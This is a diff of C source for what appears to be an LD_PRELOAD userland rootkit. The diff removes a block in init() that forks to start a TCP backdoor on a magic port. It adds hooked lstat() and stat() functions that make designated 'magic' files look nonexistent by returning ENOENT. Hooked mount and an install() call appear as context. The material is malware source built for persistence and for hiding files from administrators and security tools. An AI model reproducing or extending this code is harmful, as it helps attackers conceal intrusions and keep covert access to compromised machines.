@@ -28,16 +28,6 @@ init(void)
     #else
     install();
     #endif
-    if (is_port_usable(MAGIC_PORT)){
-        int nChild = fork();
-        if (nChild == 0){
-            #ifdef DEBUG
-            printf("[-] FORKING\n");
-            #endif
-            start_tcp_backdoor();
-            exit(0);
-        }
-    }
 }
 
 /*
@@ -387,4 +377,27 @@ int mount(const char *source, const char *target,
         hooked_mount = load_libc("mount");
     }
     return hooked_mount(source, target, filesystemtype, mountflags, data);
+}
+
+int lstat(const char *pathname, struct stat *buf){
+    printf("[+] Hooked LSTAT :: %s \n", pathname);
+    if (!hooked_xlstat){
+        hooked_xlstat = load_libc("__xlstat");
+    }
+    char realpathname[PATH_MAX];
+    realpath(pathname, realpathname);
+    if (is_magicfile(realpathname)){
+        printf("BAAAD FILE! .smirk\n");
+        errno = ENOENT;
+        return -1;
+    }
+    printf("GOOD FILE!  .smirk\n");
+    return hooked_xlstat(pathname, buf);
+}
+
+int stat(const char *pathname, struct stat *buf){
+    printf("[+] Hooked STAT \n");
+    char realpathname[PATH_MAX];
+    realpath(pathname, realpathname);
+    return lstat(realpathname, buf);
 }
